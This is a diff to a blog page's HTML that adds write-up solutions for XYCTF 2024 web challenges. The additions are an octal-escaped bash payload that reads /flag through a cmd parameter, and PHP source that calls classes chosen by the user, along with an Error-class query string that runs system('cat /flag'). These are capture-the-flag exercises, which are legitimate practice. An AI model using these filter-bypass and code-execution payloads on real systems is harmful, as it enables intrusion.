@@ -261,7 +261,7 @@
 
 	<a href="/2024/04/05/2024_XYCTF/" itemprop="url">
 		<time datetime="2024-04-05T05:36:10.775Z" itemprop="dateUpdated">
-	  		2024-04-27
+	  		2024-05-02
 	  </time>
 	</a> 
 
@@ -312,7 +312,15 @@
 
 <p><img src="/../img/barry.jpg" alt="barry"></p>
 <p><img src="/../img/james.jpg" alt="james"></p>
-<h2><span id="ezpop">ezPOP</span></h2><h2><span id="ezrce">ezRCE</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$&#x27;\143\141\164&#x27;&lt;$&#x27;\057\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure>
+<h2><span id="ezpop">ezPOP</span></h2><h2><span id="ezrce八进制">ezRCE;八进制</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$&#x27;\143\141\164&#x27;&lt;$&#x27;\057\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\143\141\164&#x27;&lt;$&#x27;\57\146\154\141\147&#x27; // cat&lt;/flag</span><br></pre></td></tr></table></figure>
+
+<h2><span id="ezclass">ezclass</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=<span class="built_in">Error</span>&amp;aa=system&amp;c=getMessage&amp;b=<span class="built_in">Error</span>&amp;bb=cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure>
+
+
 
 <h1><span id="reverse">Reverse</span></h1><h2><span id="你是真的大学生吗">你是真的大学生吗？</span></h2>	
 		</div>
